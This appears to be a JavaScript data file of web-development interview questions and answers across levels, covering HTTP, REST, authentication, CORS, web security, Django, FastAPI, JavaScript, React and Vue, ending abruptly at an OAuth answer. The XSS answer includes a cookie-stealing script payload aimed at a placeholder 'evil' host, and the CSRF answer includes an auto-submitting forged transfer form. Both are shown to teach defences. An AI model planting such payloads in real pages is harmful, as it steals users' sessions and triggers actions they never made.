// ============== CONFIGURATION ==============

export const LEVELS = {
  trainee: { label: "TRAINEE", color: "#39ff14", order: 1 }, // electric lime
  junior:  { label: "JUNIOR",  color: "#00d4ff", order: 2 }, // electric cyan
  middle:  { label: "MIDDLE",  color: "#fff200", order: 3 }, // electric yellow
  senior:  { label: "SENIOR",  color: "#ff7a00", order: 4 }, // electric orange
  lead:    { label: "LEAD",    color: "#ff00aa", order: 5 }, // magenta
  tricky:  { label: "TRICKY",  color: "#ff003c", order: 6 }, // hot red
};

export const TOPICS = {
  http:       "HTTP & Protocol",
  rest:       "REST & API Design",
  auth:       "Authentication",
  authz:      "Authorization",
  cors:       "CORS & Same-Origin",
  security:   "Web Security (OWASP)",
  cookies:    "Cookies & Sessions",
  django:     "Django",
  fastapi:    "FastAPI",
  middleware: "Middleware",
  js:         "JavaScript",
  dom:        "DOM & Browser",
  react:      "React",
  vue:        "Vue",
  css:        "CSS & Layout",
  perf:       "Performance",
  realtime:   "WebSockets & SSE",
  testing:    "Testing",
  deploy:     "Deployment & Ops",
};

// ============== QUESTIONS ==============

export const QUESTIONS = [
  // ============================================================
  // ============== TRAINEE ==============
  // ============================================================
  {
    id: 1, level: "trainee", topic: "http",
    q: "What is HTTP and how does a request/response cycle work?",
    a: `HTTP (HyperText Transfer Protocol) is a stateless, text-based protocol on top of TCP (or QUIC for HTTP/3) used to exchange data between client and server.

THE CYCLE:
1. Client opens a TCP connection to host:port (default 80 for http, 443 for https).
2. Client sends a REQUEST: method + path + headers + optional body.
   GET /users/42 HTTP/1.1
   Host: api.example.com
   Accept: application/json
3. Server processes and returns a RESPONSE: status line + headers + optional body.
   HTTP/1.1 200 OK
   Content-Type: application/json
   {"id":42,"name":"Andrei"}
4. Connection may close or stay open (keep-alive / HTTP/2 multiplexed streams).

STATELESS means: each request is independent. The server doesn't remember the previous one — that's what cookies, sessions, and tokens exist to fix.`,
    keywords: ["http", "tcp", "request", "response", "stateless"],
  },
  {
    id: 2, level: "trainee", topic: "http",
    q: "Name the main HTTP methods and what each is for.",
    a: `• GET — read a resource. Idempotent, safe (no side effects). Cacheable.
• POST — create or trigger an action. Not idempotent.
• PUT — replace a resource entirely. Idempotent.
• PATCH — partial update of a resource. Not necessarily idempotent (depends on operation).
• DELETE — remove a resource. Idempotent.
• HEAD — same as GET but no body (used to check existence / headers).
• OPTIONS — ask the server what's allowed (used by CORS preflight).

SAFE = no server state changes. IDEMPOTENT = doing it N times = doing it once.
Browsers won't cache POST/PUT/DELETE; proxies often retry GET on network errors but never POST.`,
    keywords: ["GET", "POST", "PUT", "PATCH", "DELETE", "idempotent", "safe"],
  },
  {
    id: 3, level: "trainee", topic: "http",
    q: "Explain HTTP status code categories. Give examples.",
    a: `1xx — Informational (rare). 100 Continue, 101 Switching Protocols (used for WebSocket upgrade).
2xx — Success. 200 OK, 201 Created, 204 No Content (success, no body), 206 Partial Content.
3xx — Redirection. 301 Moved Permanently, 302 Found (temporary), 304 Not Modified (cache hit).
4xx — Client error. 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Unprocessable Entity, 429 Too Many Requests.
5xx — Server error. 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout.

CONFUSING ONES:
• 401 = "I don't know who you are" (no/invalid auth).
• 403 = "I know who you are, but you can't have it" (authorized but forbidden).
• 422 vs 400 — both client errors; 422 is "syntax OK, semantics bad" (e.g., missing required field with valid JSON).`,
    keywords: ["status", "200", "401", "403", "404", "500"],
  },
  {
    id: 4, level: "trainee", topic: "http",
    q: "What is the difference between HTTP and HTTPS?",
    a: `HTTPS = HTTP over TLS (Transport Layer Security). It adds three guarantees:

1. ENCRYPTION — observers can't read the request/response body or headers (URL path included).
2. INTEGRITY — observers can't modify the data without detection.
3. AUTHENTICATION — the certificate proves the server is who it claims to be (signed by a CA you trust).

The TLS handshake exchanges keys (typically using ECDHE for forward secrecy) before the HTTP exchange begins. Modern setups use TLS 1.3 — fewer round trips and stronger defaults.

Why everything is HTTPS now:
• Browsers mark plain HTTP as "Not Secure".
• Service workers, geolocation, camera, HTTP/2, HTTP/3 all REQUIRE HTTPS.
• Free certificates (Let's Encrypt) removed the cost excuse.`,
    keywords: ["TLS", "SSL", "encryption", "certificate", "HTTPS"],
  },
  {
    id: 5, level: "trainee", topic: "rest",
    q: "What is REST? List its core principles.",
    a: `REST (REpresentational State Transfer) is an architectural style for HTTP APIs. Coined by Roy Fielding in 2000.

CORE PRINCIPLES:
• CLIENT-SERVER — clear separation; the client doesn't know how the server stores data.
• STATELESS — every request contains all info needed; no session state on the server.
• CACHEABLE — responses say whether/for how long they can be cached.
• UNIFORM INTERFACE — resources have URIs, actions are HTTP verbs, representations are JSON/XML.
• LAYERED SYSTEM — proxies/gateways/CDNs are transparent.
• RESOURCE-ORIENTED — URLs name THINGS (/users/42), not actions (/getUser?id=42).

REST conventions you'll be tested on:
GET    /users      → list
POST   /users      → create
GET    /users/42   → read one
PUT    /users/42   → replace
PATCH  /users/42   → partial update
DELETE /users/42   → delete`,
    keywords: ["REST", "resource", "stateless", "uniform", "Fielding"],
  },
  {
    id: 6, level: "trainee", topic: "auth",
    q: "What is the difference between authentication and authorization?",
    a: `AUTHENTICATION (AuthN) — "Who are you?" Verifying identity (login, password, fingerprint, certificate).
AUTHORIZATION (AuthZ) — "What are you allowed to do?" Granting access to specific resources/actions.

Order: ALWAYS authenticate first, then authorize.

Concrete:
• Authentication: comparing the password hash; validating a JWT signature; verifying an SSO token.
• Authorization: checking that the user has role="admin" before letting them delete a post; checking that user.id == post.author_id before allowing an edit.

Status codes:
• 401 Unauthorized → AUTHENTICATION failed (the name is misleading; should have been "Unauthenticated").
• 403 Forbidden → AUTHORIZATION failed.`,
    keywords: ["authentication", "authorization", "authn", "authz", "401", "403"],
  },
  {
    id: 7, level: "trainee", topic: "cookies",
    q: "What is a cookie and how does the browser send it back?",
    a: `A cookie is a small key-value pair (max ~4 KB) the server tells the browser to store and re-send on subsequent requests to the same domain.

THE FLOW:
1. Server response sets it: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
2. Browser stores it.
3. On the next request to the same origin, browser automatically attaches: Cookie: session=abc123

KEY ATTRIBUTES:
• HttpOnly — JS can't read it (document.cookie hides it). Defense against XSS stealing the cookie.
• Secure — only sent over HTTPS.
• SameSite=Strict | Lax | None — controls whether the cookie is sent on cross-site requests (CSRF defense).
• Domain / Path — scope.
• Expires / Max-Age — lifetime; without them it's a session cookie (deleted when browser closes).

A session cookie usually contains an ID; the actual session data lives on the server (Redis, DB).`,
    keywords: ["cookie", "Set-Cookie", "HttpOnly", "Secure", "SameSite"],
  },
  {
    id: 8, level: "trainee", topic: "django",
    q: "What is Django? Explain MTV.",
    a: `Django is a "batteries-included" Python web framework. It ships with an ORM, admin, auth, forms, templating, migrations, and a dev server out of the box.

MTV = Model · Template · View. (Django's name for MVC, with the roles slightly renamed.)

• MODEL — Python class that defines a DB table (Django ORM). Inherits from models.Model.
• TEMPLATE — HTML file with the Django Template Language ({{ var }}, {% if %}). The "View" in classic MVC.
• VIEW — Python function (or class) that takes a request, talks to models, returns an HttpResponse. The "Controller" in classic MVC.

URL routing (urls.py) maps a URL pattern to a view. The middleware stack wraps every request/response.`,
    keywords: ["Django", "MTV", "model", "template", "view", "framework"],
  },
  {
    id: 9, level: "trainee", topic: "fastapi",
    q: "What is FastAPI? Why is it called \"fast\"?",
    a: `FastAPI is a modern Python web framework built on Starlette (ASGI) for the web layer and Pydantic for validation.

WHY "FAST":
1. RUNTIME — async-first on Starlette/uvicorn; much higher throughput than WSGI Django/Flask for I/O-bound workloads.
2. DEVELOPMENT — type hints drive automatic request validation, response serialization, OpenAPI docs (Swagger UI at /docs), and editor autocomplete. You write less code.

Minimal example:
  from fastapi import FastAPI
  from pydantic import BaseModel

  app = FastAPI()

  class Item(BaseModel):
      name: str
      price: float

  @app.post("/items/")
  async def create(item: Item):
      return {"received": item.name}

You get JSON parsing, validation, error responses, and Swagger docs for free.`,
    keywords: ["FastAPI", "Pydantic", "Starlette", "async", "ASGI"],
  },
  {
    id: 10, level: "trainee", topic: "js",
    q: "What is JavaScript? Where does it run?",
    a: `JavaScript is a single-threaded, dynamically typed, prototype-based language. The standard is ECMAScript (ES); modern browsers and Node target ES2015 (ES6) and later.

WHERE IT RUNS:
• Browser — interprets <script> tags. Each browser has an engine (V8 in Chrome/Edge, SpiderMonkey in Firefox, JavaScriptCore in Safari).
• Node.js / Deno / Bun — JS on the server, built on top of V8 or JavaScriptCore.
• Embedded — Cloudflare Workers, AWS Lambda@Edge, etc.

KEY TRAITS:
• Single-threaded — one call stack. Concurrency is achieved via the EVENT LOOP + asynchronous I/O.
• Dynamic — types are checked at runtime; same variable can hold a string then a number.
• Prototype-based — objects inherit from other objects (no classical classes; class syntax is sugar over prototypes).
• First-class functions — functions can be passed, returned, and assigned like any value.`,
    keywords: ["JavaScript", "ECMAScript", "V8", "single-threaded", "prototype"],
  },
  {
    id: 11, level: "trainee", topic: "dom",
    q: "What is the DOM?",
    a: `The DOM (Document Object Model) is a tree representation of an HTML/XML document that the browser builds from the parsed source.

Each HTML tag becomes a NODE. Text and attributes are also nodes.

JS interacts with the DOM through the global \`document\`:
  document.getElementById("x")        // find by id
  document.querySelector(".btn")     // find by CSS selector
  el.textContent = "hello"           // change text
  el.classList.add("active")         // toggle classes
  el.addEventListener("click", fn)   // attach listener

The DOM is what you SEE rendered. CSSOM is the parallel tree for styles. Together they're combined into the RENDER TREE used to paint the page.

KEY POINT: Updating the DOM is expensive — it can trigger layout (reflow) and paint. Frameworks like React batch and minimize these updates via the Virtual DOM.`,
    keywords: ["DOM", "tree", "document", "node", "querySelector"],
  },
  {
    id: 12, level: "trainee", topic: "css",
    q: "What is the difference between Flexbox and Grid?",
    a: `Both are CSS layout systems, but they solve different problems.

FLEXBOX — one-dimensional. Lays children out along a single axis (row OR column). Use when:
• A toolbar of buttons.
• Centering a card vertically and horizontally.
• Spacing items in a navbar.

  .container { display: flex; gap: 12px; justify-content: space-between; }

GRID — two-dimensional. Lays children out in rows AND columns simultaneously. Use when:
• A page layout (sidebar + main + footer).
• A photo gallery in N columns that wraps.
• Anything where you'd reach for a table.

  .container { display: grid; grid-template-columns: 200px 1fr; gap: 16px; }

RULE OF THUMB: if you find yourself nesting flexboxes to make a grid, switch to grid.`,
    keywords: ["flexbox", "grid", "layout", "css"],
  },

  // ============================================================
  // ============== JUNIOR ==============
  // ============================================================
  {
    id: 20, level: "junior", topic: "http",
    q: "Explain HTTP/1.1 vs HTTP/2 vs HTTP/3.",
    a: `HTTP/1.1 (1997)
• One request per TCP connection at a time. Pipelining was attempted but broken in practice.
• Workaround: 6 parallel connections per origin (browser limit) — leads to "head-of-line blocking" at TCP level.
• Plain text headers, repeated per request.

HTTP/2 (2015)
• MULTIPLEXING — many concurrent streams over one TCP connection. No more head-of-line blocking AT HTTP LEVEL (still at TCP level if a packet drops).
• Binary framing instead of text.
• Header compression (HPACK).
• Server push (mostly deprecated now).
• Always over TLS in browsers.

HTTP/3 (2022)
• Runs over QUIC instead of TCP. QUIC is on top of UDP.
• Eliminates TCP head-of-line blocking entirely — a dropped packet only stalls one stream.
• Faster handshake (0-RTT possible).
• Connection migration (your phone switches Wi-Fi → cellular without dropping the connection).

UPSHOT: HTTP/2 fixed app-level concurrency, HTTP/3 fixed transport-level concurrency.`,
    keywords: ["HTTP/2", "HTTP/3", "QUIC", "multiplexing", "head-of-line"],
  },
  {
    id: 21, level: "junior", topic: "rest",
    q: "When would you choose 200, 201, 202, 204, 207?",
    a: `200 OK — generic success with a body. Use for GET that returns a payload, or PATCH/POST that immediately returns the updated resource.

201 Created — POST/PUT that created a new resource. Conventionally include a Location header pointing to the new resource.
  HTTP/1.1 201 Created
  Location: /users/42

202 Accepted — request received, processing async. Use for "we'll get to it"; client should poll or receive a webhook.

204 No Content — success, no body. Use for DELETE that succeeded, or PUT/PATCH where you don't return the resource.

207 Multi-Status — used in WebDAV / batch endpoints where individual operations have their own statuses.

ANTI-PATTERN: returning 200 with {"success": false, "error": "..."} for failures. Use 4xx/5xx — that's literally what they exist for. Tooling (browsers, retries, monitoring) reads the status, not your body.`,
    keywords: ["status", "201", "202", "204", "207", "REST"],
  },
  {
    id: 22, level: "junior", topic: "auth",
    q: "Sessions vs JWT — explain both and when to use each.",
    a: `SESSIONS (server-side)
1. User logs in → server creates session record in Redis/DB.
2. Server returns Set-Cookie: session_id=opaque-random-blob.
3. Browser sends cookie on every request; server looks up session_id → user.

PROS: revocation is trivial (delete the row). Cookie is small. Works great if you have one app + one DB.
CONS: server must remember every active session. Doesn't scale well across many independent services.

JWT (token, stateless)
1. User logs in → server signs a token: header.payload.signature (HS256 or RS256).
2. Server returns token to client (often in Authorization: Bearer <jwt>).
3. Client sends token; server VERIFIES SIGNATURE — no DB lookup needed.

PROS: stateless, easy to share across microservices, works with mobile/native.
CONS: revocation is HARD — you must keep a denylist or use short expiries + refresh tokens. Tokens get big (carry user data). Storing JWT in localStorage = XSS risk.

DECISION:
• Single web app, sticky session DB → use sessions.
• Multiple services / mobile → use JWT (or OAuth tokens).
• In a monolith with Redis: just use sessions. JWT is over-engineered for that.`,
    keywords: ["session", "JWT", "token", "cookie", "stateless"],
  },
  {
    id: 23, level: "junior", topic: "auth",
    q: "What is a JWT actually made of?",
    a: `A JWT is three Base64URL-encoded parts joined with dots: HEADER.PAYLOAD.SIGNATURE.

HEADER (JSON):
  {"alg":"HS256","typ":"JWT"}

PAYLOAD / CLAIMS (JSON):
  {
    "sub":"user-42",
    "iat":1730000000,
    "exp":1730003600,
    "iss":"api.example.com",
    "aud":"web-app",
    "role":"admin"
  }

SIGNATURE:
  HMAC_SHA256( base64url(header) + "." + base64url(payload), SECRET )

CRITICAL POINTS:
• The PAYLOAD IS NOT ENCRYPTED. It's just base64. Anyone who has the token can read it. Don't put secrets there.
• The SIGNATURE proves the payload wasn't modified.
• HS256 = symmetric (same secret for sign and verify). RS256 = asymmetric (private key signs, public verifies — better for distributing tokens to many services).
• alg=none was a real attack — libraries used to accept it. Always pin the expected alg explicitly.`,
    keywords: ["JWT", "HS256", "RS256", "claims", "signature"],
  },
  {
    id: 24, level: "junior", topic: "cors",
    q: "What is CORS and why does it exist?",
    a: `CORS (Cross-Origin Resource Sharing) is a BROWSER mechanism that loosens the SAME-ORIGIN POLICY for HTTP requests.

SAME-ORIGIN POLICY: a page from origin A (scheme + host + port) can't read responses from origin B by default. This stops a malicious site from reading your bank's pages while you're logged in.

CORS lets server B explicitly say "origin A is allowed to read my responses" via response headers:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Credentials: true   (only if you need cookies)
  Access-Control-Allow-Methods: GET, POST, PUT
  Access-Control-Allow-Headers: Content-Type, Authorization

CRITICAL MENTAL MODELS:
• CORS is enforced BY THE BROWSER. curl/Postman ignore it.
• CORS doesn't STOP the request from reaching the server — it stops the BROWSER from giving the response back to your JS.
• Wildcard Access-Control-Allow-Origin: * is incompatible with credentials (cookies/auth headers). Browser will reject.`,
    keywords: ["CORS", "same-origin", "browser", "Access-Control"],
  },
  {
    id: 25, level: "junior", topic: "cors",
    q: "What is a CORS preflight request?",
    a: `For "non-simple" cross-origin requests, the browser first sends an OPTIONS request asking for permission BEFORE sending the real request. This is the PREFLIGHT.

A request is "simple" (no preflight) only if all of:
• Method is GET, HEAD, or POST.
• Headers are limited (Accept, Accept-Language, Content-Language, Content-Type with values text/plain, application/x-www-form-urlencoded, or multipart/form-data).
• No custom headers like Authorization or X-Requested-With.

Anything else triggers a preflight:
  OPTIONS /api/items HTTP/1.1
  Origin: https://app.example.com
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: Authorization, Content-Type

Server replies:
  HTTP/1.1 204 No Content
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: PUT
  Access-Control-Allow-Headers: Authorization, Content-Type
  Access-Control-Max-Age: 600

If the preflight fails or the real request's headers don't match, the browser blocks the real request. Use Access-Control-Max-Age to avoid a preflight on every call.`,
    keywords: ["preflight", "OPTIONS", "CORS", "simple-request"],
  },
  {
    id: 26, level: "junior", topic: "security",
    q: "What is XSS? Name the three types and how to prevent.",
    a: `XSS (Cross-Site Scripting) — attacker injects JavaScript that runs in another user's browser, in the context of YOUR origin. With your origin, attacker can read cookies, exfiltrate data, perform actions as the user.

THREE TYPES:
1. STORED (persistent) — payload saved in DB and served to other users. Example: a comment containing <script>fetch('//evil/?c='+document.cookie)</script>.
2. REFLECTED — payload in URL is echoed into the page. Example: search?q=<script>... and your template renders {{ q }} unescaped.
3. DOM-BASED — JS reads from URL/hash and writes to innerHTML without sanitizing.

PREVENTION (in order of importance):
• OUTPUT ENCODE everything you render. Templating engines (Django, Jinja, React JSX) auto-escape HTML by default. Never bypass with safe / Django |safe / React's raw-HTML escape hatch unless you trust the source.
• CONTENT SECURITY POLICY header (CSP) — restrict where scripts can come from. Defense in depth.
• HttpOnly cookies — at least the session cookie can't be stolen via document.cookie.
• Don't build HTML by string concatenation in JS — use textContent / .createElement.
• Sanitize HTML when you must accept it (DOMPurify).`,
    keywords: ["XSS", "stored", "reflected", "DOM", "CSP"],
  },
  {
    id: 27, level: "junior", topic: "security",
    q: "What is CSRF? How do you defend against it?",
    a: `CSRF (Cross-Site Request Forgery) — attacker tricks a logged-in user's BROWSER into making an authenticated request to your site. The browser auto-attaches cookies, so the request looks legit.

EXAMPLE ATTACK: user is logged into bank.com. They visit evil.com which has:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
  </form>
  <script>document.forms[0].submit()</script>

The browser sends the bank's session cookie automatically → transfer goes through.

DEFENSES (use multiple):
• SameSite cookies — set SameSite=Lax (or Strict). Browsers won't send the cookie on a cross-site POST. This alone defeats most CSRF, and it's the modern default in Chrome.
• CSRF TOKEN — server embeds a random token in the form/page; the request must echo it back in a header or hidden field. Attacker's site can't read it (same-origin policy).
• Double-submit cookie — server sets cookie + matching value in header; verifies they match.
• Re-authenticate or require a one-time confirmation for high-value actions.

Why GET should be safe (no side effects): an <img src="bank.com/transfer?...> would CSRF if GET mutated state. Don't mutate on GET.`,
    keywords: ["CSRF", "SameSite", "token", "cookie"],
  },
  {
    id: 28, level: "junior", topic: "django",
    q: "What is Django middleware? How does it work?",
    a: `Middleware is a stack of components that wrap every Django request/response. Configured in settings.MIDDLEWARE — order matters.

EACH MIDDLEWARE looks like:
  class MyMiddleware:
      def __init__(self, get_response):
          self.get_response = get_response  # the next link in the chain

      def __call__(self, request):
          # CODE HERE RUNS ON THE WAY IN
          response = self.get_response(request)  # call the next layer
          # CODE HERE RUNS ON THE WAY OUT
          return response

REQUEST flows TOP → BOTTOM through MIDDLEWARE list.
RESPONSE flows BOTTOM → TOP.

Built-in examples (typical order):
• SecurityMiddleware — sets HSTS, redirects to HTTPS.
• SessionMiddleware — loads/saves request.session.
• CsrfViewMiddleware — verifies CSRF token.
• AuthenticationMiddleware — sets request.user from the session.
• MessageMiddleware — flash messages.

ORDER matters: SessionMiddleware must come BEFORE AuthenticationMiddleware (auth reads from session).
WHEN TO USE: cross-cutting concerns — logging, request IDs, timing, tenant resolution, rate limiting.`,
    keywords: ["Django", "middleware", "MIDDLEWARE", "request"],
  },
  {
    id: 29, level: "junior", topic: "fastapi",
    q: "What is dependency injection in FastAPI?",
    a: `FastAPI's Depends() lets you declare a function/object that should be RESOLVED and INJECTED into your endpoint. The framework calls the dependency, caches it per-request, and passes the result.

  from fastapi import Depends, HTTPException

  def get_db():
      db = SessionLocal()
      try: yield db
      finally: db.close()

  def current_user(token: str = Header(...), db = Depends(get_db)):
      user = db.query(User).filter_by(token=token).first()
      if not user: raise HTTPException(401)
      return user

  @app.get("/me")
  def me(user = Depends(current_user)):
      return user

WHY THIS IS GREAT:
• Composable — current_user depends on get_db, which is reused everywhere.
• Per-request cached — same Depends called twice in one request runs once.
• Testable — override with app.dependency_overrides[get_db] = fake_db.
• "yield" dependencies handle setup/teardown (DB session, file handles).

Use it for: DB sessions, current user, pagination params, feature flags, API client instances.`,
    keywords: ["Depends", "DI", "dependency", "FastAPI"],
  },
  {
    id: 30, level: "junior", topic: "js",
    q: "Explain var, let, const.",
    a: `var (legacy) — function-scoped, hoisted, can be redeclared. Avoid in modern code.
let — block-scoped, hoisted to "temporal dead zone" (TDZ); accessing before declaration throws. Reassignable.
const — block-scoped, TDZ, NOT reassignable. The BINDING is constant, not the value:
  const arr = [];
  arr.push(1);   // OK — mutating the array, not reassigning arr
  arr = [];      // TypeError — reassignment not allowed

GOTCHA: hoisting differences:
  console.log(x);  // undefined  (var hoisted as undefined)
  var x = 1;

  console.log(y);  // ReferenceError (TDZ)
  let y = 1;

RULE: default to const, switch to let only when you must reassign, never use var.`,
    keywords: ["var", "let", "const", "hoisting", "TDZ"],
  },
  {
    id: 31, level: "junior", topic: "js",
    q: "What is the event loop in JavaScript?",
    a: `JS is single-threaded — one CALL STACK. The event loop is the mechanism that schedules async work.

THE PIECES:
• CALL STACK — synchronous code runs here.
• WEB APIS / NODE APIS — setTimeout, fetch, fs.readFile run OUTSIDE the JS engine.
• MACROTASK QUEUE (task queue) — setTimeout, setInterval, I/O callbacks.
• MICROTASK QUEUE — Promise .then/.catch, queueMicrotask, MutationObserver.

THE LOOP:
1. Run all sync code on the stack until empty.
2. Drain ALL microtasks (chains of .then resolve immediately).
3. Render (browser only, when needed).
4. Pull ONE macrotask, push it onto the stack, go to step 1.

CONSEQUENCES:
  console.log("A");
  setTimeout(() => console.log("B"), 0);
  Promise.resolve().then(() => console.log("C"));
  console.log("D");
  // A D C B  ← microtasks (C) run before next macrotask (B)

A long-running synchronous loop blocks EVERYTHING — animations, clicks, network callbacks. Yield with await new Promise(r => setTimeout(r, 0)) or move to a Web Worker.`,
    keywords: ["event-loop", "microtask", "macrotask", "promise"],
  },
  {
    id: 32, level: "junior", topic: "js",
    q: "Promise vs async/await — what's the relationship?",
    a: `async/await is SYNTACTIC SUGAR over Promises. Under the hood, an async function returns a Promise.

  // Promise version
  function loadUser() {
    return fetch("/me")
      .then(r => r.json())
      .then(user => { console.log(user); return user; })
      .catch(err => console.error(err));
  }

  // async/await version
  async function loadUser() {
    try {
      const r = await fetch("/me");
      const user = await r.json();
      console.log(user);
      return user;
    } catch (err) {
      console.error(err);
    }
  }

KEY POINTS:
• await x is equivalent to .then on x — it pauses the async function until the promise resolves.
• An async function ALWAYS returns a Promise, even if you return a plain value.
• try/catch with await replaces .catch.
• PARALLEL: don't do sequential awaits if independent. Use Promise.all:
    const [a, b] = await Promise.all([fetch("/a"), fetch("/b")]);
• Top-level await is allowed in ES modules.`,
    keywords: ["promise", "async", "await", "then"],
  },
  {
    id: 33, level: "junior", topic: "react",
    q: "What is React and what is JSX?",
    a: `React is a UI library for building component-based interfaces with a one-way data flow. Each component is a function (or class) that returns a description of UI.

JSX is an HTML-like syntax inside JS. It's NOT HTML — it compiles to React.createElement() calls:

  // JSX
  const el = <button onClick={fn}>Hi {name}</button>;

  // Compiles to
  const el = React.createElement("button", { onClick: fn }, "Hi ", name);

WHAT THE COMPONENT RETURNS is a virtual DOM tree (plain JS objects), not real DOM.

CORE IDEAS:
• COMPONENTS — reusable pieces of UI.
• PROPS — inputs, immutable from the child's perspective.
• STATE — internal data; updates trigger re-render.
• ONE-WAY FLOW — data goes parent → child via props; child notifies parent via callbacks.
• DECLARATIVE — you describe what the UI should look like for given state, React figures out the DOM mutations.`,
    keywords: ["React", "JSX", "component", "props", "state"],
  },
  {
    id: 34, level: "junior", topic: "react",
    q: "What are the rules of React hooks?",
    a: `1. ONLY CALL HOOKS AT THE TOP LEVEL.
   Not inside loops, conditions, or nested functions. React tracks hooks by call order; conditional calls would shift the order between renders and break state.

2. ONLY CALL HOOKS FROM REACT FUNCTIONS.
   From functional components or other custom hooks (which must be named useXxx).

WHY: React keeps an array of hook states per component, indexed by call order. If you do:

   if (cond) { useState(...) }   // ❌ wrong
   useEffect(...)

then on render 1 (cond=true) you use 2 hooks, on render 2 (cond=false) you use 1 — useEffect's state is now indexed wrong.

ESLint plugin react-hooks/rules-of-hooks catches this. Always enable it.

Common hooks:
useState — local state.
useEffect — side effects (fetch, subscribe). Cleanup on unmount.
useRef — mutable ref that doesn't trigger re-render.
useMemo / useCallback — memoize expensive values / functions.
useContext — read context.
useReducer — Redux-style local state.`,
    keywords: ["hooks", "useState", "useEffect", "rules"],
  },
  {
    id: 35, level: "junior", topic: "vue",
    q: "What is Vue's reactivity system?",
    a: `Vue's reactivity automatically updates the DOM when reactive data changes.

VUE 2: used Object.defineProperty to install getter/setter on every property. Couldn't detect array index assignment or new property addition.

VUE 3: rebuilt on top of Proxy. The reactive() / ref() functions wrap an object/value in a Proxy that:
• Tracks reads (component "subscribes" to the property it touches).
• Triggers re-render on writes.

Composition API example:
  import { ref, computed } from 'vue';

  const count = ref(0);                         // ref wraps a primitive
  const double = computed(() => count.value*2); // recomputes when count changes
  count.value++;                                // triggers re-render of any
                                                // component using count

WHY PROXY > DEFINEPROPERTY:
• Detects new property additions automatically.
• Handles arrays naturally.
• Lazier — only proxies when accessed.

Compared to React: Vue tracks DEPENDENCIES per component (fine-grained), so unrelated state changes don't re-render the whole tree. React re-renders the component on any setState; you opt out via memo/useMemo.`,
    keywords: ["Vue", "reactivity", "Proxy", "ref", "reactive"],
  },
  {
    id: 36, level: "junior", topic: "middleware",
    q: "What is middleware in general (Express, Django, FastAPI)?",
    a: `MIDDLEWARE is a function that sits between the HTTP server and your business logic. It receives the request, can modify it, then either pass it on or short-circuit (return a response).

PATTERN — the "onion":
  request → MW1 → MW2 → MW3 → handler → MW3 → MW2 → MW1 → response

Common things to put in middleware:
• Logging request/response.
• Authentication: parse a token → attach user to request.
• CORS headers.
• Rate limiting.
• Compression (gzip, brotli).
• Request ID generation for tracing.
• Error handling: catch exceptions → format JSON error.

EXPRESS (Node):
  app.use((req, res, next) => {
    console.log(req.method, req.url);
    next();        // pass to next middleware
  });

DJANGO (class-based, see Django middleware Q for full pattern).

FASTAPI:
  @app.middleware("http")
  async def add_header(request, call_next):
      response = await call_next(request)
      response.headers["X-Process-Time"] = "..."
      return response

KEY INSIGHT: ORDER MATTERS. Put auth before route-specific MWs. Put logging at the outermost layer so you log everything (including failures from inner MWs).`,
    keywords: ["middleware", "next", "chain", "express", "django"],
  },

  // ============================================================
  // ============== MIDDLE ==============
  // ============================================================
  {
    id: 50, level: "middle", topic: "http",
    q: "Explain HTTP caching: Cache-Control, ETag, Last-Modified.",
    a: `HTTP caching prevents re-downloading unchanged resources. Two layers:

1. FRESHNESS — "do I need to ask the server at all?"
   Cache-Control: max-age=3600         → use cached copy for 1 hour, no request.
   Cache-Control: no-cache             → must REVALIDATE (ask server) before use.
   Cache-Control: no-store             → never cache. Use for sensitive responses.
   Cache-Control: public               → CDNs/proxies can cache.
   Cache-Control: private              → only the user's browser can cache.
   Cache-Control: immutable            → resource will NEVER change (use with hashed asset filenames).

2. VALIDATION — "is my cached copy still valid?"
   ETAG: server sends ETag: "abc123" (a hash/version of the body).
   On next request: client sends If-None-Match: "abc123".
   Server compares; if same → 304 Not Modified (no body, saves bandwidth).
   LAST-MODIFIED: similar but date-based. ETag is preferred.

WORKFLOW for static assets in modern apps:
• HTML response: Cache-Control: no-cache (always check).
• Hashed JS/CSS (app.abc123.js): Cache-Control: public, max-age=31536000, immutable.

Result: HTML always fresh; assets cached forever, busted by new hashes on deploy.`,
    keywords: ["caching", "Cache-Control", "ETag", "304", "max-age"],
  },
  {
    id: 51, level: "middle", topic: "rest",
    q: "What is REST idempotency and why does it matter for retries?",
    a: `IDEMPOTENT = doing the operation N times has the same effect as doing it once.

By spec:
• GET, HEAD, PUT, DELETE → idempotent.
• POST, PATCH → not necessarily.

WHY THIS MATTERS:
A flaky network. Client sends POST /charge $10. Server processes it but the response is lost. Did it go through? Client retries. Customer charged $20.

FIX: make POST endpoints idempotent via an IDEMPOTENCY KEY:
  POST /charges
  Idempotency-Key: 9d8a3f-uuid-from-client
  {"amount":1000}

Server logic:
1. Look up the key in a "seen" table.
2. If found → return the previous response.
3. If not → process AND store the response keyed by the key.

Stripe uses this exact pattern. Window: typically 24 hours of dedup.

DELETE — idempotent BY SPEC: DELETE /users/42 twice should both succeed (or 2nd returns 404). Don't make the second call return an error if the resource is already gone — return 204 or 404 consistently and document it.`,
    keywords: ["idempotency", "retry", "POST", "Idempotency-Key"],
  },
  {
    id: 52, level: "middle", topic: "auth",
    q: "Explain OAuth 2.0 Authorization Code flow with PKCE.",
    a: `OAuth 2.0 = a protocol for letting User log into App via a third-party Provider (Google, GitHub) WITHOUT giving App the password.

ROLES:
• RESOURCE OWNER (user)
• CLIENT (your app)
• AUTHORIZATION SERVER (Google)
• RESOURCE SERVER (Google's APIs)

AUTHORIZATION CODE FLOW (with PKCE — for SPAs/mobile):

1. App generates a random code_verifier and its hash (code_challenge).
2. App redirects user to Google with:
   ?response_type=code
   &client_id=...
   &redirect_uri=https://app/callback
   &scope=email
   &code_challenge=HASH
   &code_challenge_method=S256
   &state=random-anti-csrf
3. User logs in to Google, approves scopes.
4. Google redirects back: https://app/callback?code=XYZ&state=...
5. App POSTs to Google's token endpoint with the CODE + ORIGINAL code_verifier.
6. Google verifies the verifier matches the challenge → returns access_token (+ refresh_token).
7. App calls Google APIs with Authorization: Bearer <access_token>.

WHY PKCE: without it, an attacker who intercepts the redirect URL with the code could exchange it for tokens. PKCE means the attacker would also need the code_verifier, which never leaves the original app's memory.

